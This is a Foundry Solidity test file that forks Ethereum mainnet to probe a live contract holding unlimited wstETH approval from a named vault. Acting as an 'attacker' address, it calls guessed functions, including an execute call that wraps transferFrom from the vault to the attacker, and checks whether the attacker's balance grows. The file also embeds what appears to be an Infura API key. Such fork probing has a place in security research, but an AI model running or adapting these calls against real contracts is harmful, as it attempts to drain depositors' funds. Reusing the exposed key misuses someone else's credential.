// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract SpenderAnalysis is Test {
    // CRITICAL: This spender has MAX approval from Vault for wstETH
    address constant SPENDER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    // Treehouse contracts
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant ACTION_EXECUTOR = 0xb1593193Bcd7CEcc3d19597658003d735D1e9E94;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeSpenderContract() public view {
        console.log("=== CRITICAL SPENDER ANALYSIS ===\n");
        console.log("Spender:", SPENDER);

        // Get bytecode
        bytes memory code = SPENDER.code;
        console.log("Code size:", code.length);

        if (code.length == 0) {
            console.log("SPENDER IS EOA OR DESTROYED!");
            return;
        }

        // Check if it's a proxy
        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 implValue = vm.load(SPENDER, implSlot);
        address impl = address(uint160(uint256(implValue)));
        if (impl != address(0)) {
            console.log("EIP-1967 Implementation:", impl);
        }

        // Check owner
        (bool success, bytes memory data) = SPENDER.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (success && data.length == 32) {
            address owner = abi.decode(data, (address));
            console.log("Spender owner:", owner);
        }
    }

    function test_TrySpenderFunctions() public {
        console.log("=== TRYING SPENDER FUNCTIONS ===\n");

        vm.startPrank(attacker);

        uint256 vaultBalanceBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH before:", vaultBalanceBefore / 1e18);

        // Try various function calls

        // 1. Try withdrawToStrategy
        console.log("\n1. Trying withdrawToStrategy(0, 1e18)...");
        (bool success, bytes memory data) = SPENDER.call(
            abi.encodeWithSignature("withdrawToStrategy(uint256,uint256)", 0, 1e18)
        );
        console.log("Success:", success);
        if (!success && data.length > 0 && data.length < 100) {
            console.logBytes(data);
        }

        // 2. Try allocate
        console.log("\n2. Trying allocate(0, 1e18)...");
        (success, data) = SPENDER.call(
            abi.encodeWithSignature("allocate(uint256,uint256)", 0, 1e18)
        );
        console.log("Success:", success);

        // 3. Try deallocate
        console.log("\n3. Trying deallocate(0, 1e18)...");
        (success, data) = SPENDER.call(
            abi.encodeWithSignature("deallocate(uint256,uint256)", 0, 1e18)
        );
        console.log("Success:", success);

        // 4. Try rebalance
        console.log("\n4. Trying rebalance()...");
        (success, data) = SPENDER.call(
            abi.encodeWithSignature("rebalance()")
        );
        console.log("Success:", success);

        // 5. Try harvest
        console.log("\n5. Trying harvest()...");
        (success, data) = SPENDER.call(
            abi.encodeWithSignature("harvest()")
        );
        console.log("Success:", success);

        uint256 vaultBalanceAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBalance = IERC20(wstETH).balanceOf(attacker);

        console.log("\n--- Results ---");
        console.log("Vault wstETH after:", vaultBalanceAfter / 1e18);
        console.log("Attacker wstETH:", attackerBalance / 1e18);

        vm.stopPrank();
    }

    function test_SpenderRelationships() public view {
        console.log("=== SPENDER RELATIONSHIPS ===\n");

        // Check if spender knows about vault
        (bool success, bytes memory data) = SPENDER.staticcall(
            abi.encodeWithSignature("vault()")
        );
        if (success && data.length == 32) {
            address vault = abi.decode(data, (address));
            console.log("Spender.vault():", vault);
            console.log("Matches our Vault:", vault == VAULT);
        }

        // Check strategies
        for (uint i = 0; i < 4; i++) {
            (success, data) = SPENDER.staticcall(
                abi.encodeWithSignature("strategies(uint256)", i)
            );
            if (success && data.length >= 32) {
                address strat = abi.decode(data, (address));
                if (strat != address(0)) {
                    console.log("Spender.strategies(", i, "):", strat);
                }
            }
        }

        // Check owner
        (success, data) = SPENDER.staticcall(abi.encodeWithSignature("owner()"));
        if (success && data.length == 32) {
            address owner = abi.decode(data, (address));
            console.log("Spender.owner():", owner);
        }

        // Check strategyStorage
        (success, data) = SPENDER.staticcall(abi.encodeWithSignature("strategyStorage()"));
        if (success && data.length == 32) {
            address storage_ = abi.decode(data, (address));
            console.log("Spender.strategyStorage():", storage_);
        }
    }

    function test_SpenderHasExecute() public {
        console.log("=== CHECKING IF SPENDER HAS EXECUTE ===\n");

        // If spender has an execute function that can be called by anyone...
        // that could be the vulnerability!

        vm.startPrank(attacker);

        // Try execute(address,bytes)
        console.log("Trying execute(address,bytes)...");
        bytes memory transferCall = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            VAULT,
            attacker,
            1e18
        );

        (bool success, bytes memory data) = SPENDER.call(
            abi.encodeWithSignature("execute(address,bytes)", wstETH, transferCall)
        );
        console.log("Success:", success);
        if (success) {
            console.log("CRITICAL: EXECUTE WORKED!");
        }

        // Try callExecute
        console.log("\nTrying callExecute(address,bytes)...");
        (success, data) = SPENDER.call(
            abi.encodeWithSignature("callExecute(address,bytes)", wstETH, transferCall)
        );
        console.log("Success:", success);

        vm.stopPrank();
    }

    function test_SpenderDelegatecall() public {
        console.log("=== CHECKING IF SPENDER DOES DELEGATECALL ===\n");

        // If spender delegatecalls to something controllable...

        bytes memory code = SPENDER.code;

        // Look for DELEGATECALL opcode (0xf4)
        uint256 delegatecallCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                delegatecallCount++;
            }
        }
        console.log("DELEGATECALL opcodes found:", delegatecallCount);

        // Look for CALL opcode (0xf1)
        uint256 callCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf1) {
                callCount++;
            }
        }
        console.log("CALL opcodes found:", callCount);
    }
}
